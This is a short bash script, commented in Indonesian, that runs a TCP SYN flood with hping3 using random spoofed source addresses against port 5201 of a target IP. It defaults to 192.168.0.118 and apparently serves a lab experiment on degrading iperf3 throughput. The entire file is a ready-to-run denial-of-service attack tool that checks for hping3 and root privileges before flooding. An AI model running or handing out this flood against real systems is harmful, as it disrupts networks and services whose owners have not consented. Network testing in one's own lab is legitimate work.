#!/bin/bash
# Serangan TCP SYN Flood menggunakan hping3
# Script ini mengirim TCP SYN flood ke port 5201 (iperf3 server) dengan source IP random
# INI ADALAH SERANGAN PALING EFEKTIF untuk mempengaruhi pengukuran throughput!
# 
# Penggunaan:
#   sudo ./attack_tcp.sh [TARGET_IP] [TARGET_PORT]
#   
# Jika TARGET_IP tidak diberikan, default adalah 192.168.0.118
# Jika TARGET_PORT tidak diberikan, default adalah 5201 (iperf3 port)
# Tekan Ctrl+C untuk berhenti

# Default target IP dan port
TARGET_IP="${1:-192.168.0.118}"
TARGET_PORT="${2:-5201}"

echo "=========================================="
echo "   TCP SYN FLOOD ATTACK"
echo "=========================================="
echo "Target: $TARGET_IP:$TARGET_PORT"
echo "Mode: TCP SYN flood dengan random source IP"
echo "Tujuan: Mempengaruhi throughput iperf3"
echo ""
echo "CATATAN: Ini adalah serangan paling efektif!"
echo "Port 5201 adalah port default iperf3 server"
echo ""
echo "Tekan Ctrl+C untuk menghentikan serangan"
echo "=========================================="
echo ""

# Cek apakah hping3 terinstal
if ! command -v hping3 &> /dev/null; then
    echo "ERROR: hping3 tidak terinstal!"
    echo "Install dengan: sudo apt install hping3"
    exit 1
fi

# Cek apakah script dijalankan dengan sudo
if [ "$EUID" -ne 0 ]; then
    echo "ERROR: Script ini harus dijalankan dengan sudo"
    echo "Gunakan: sudo ./attack_tcp.sh"
    exit 1
fi

# Jalankan serangan
echo "Memulai TCP SYN flood ke port $TARGET_PORT..."
hping3 -S --flood --rand-source -p "$TARGET_PORT" "$TARGET_IP"
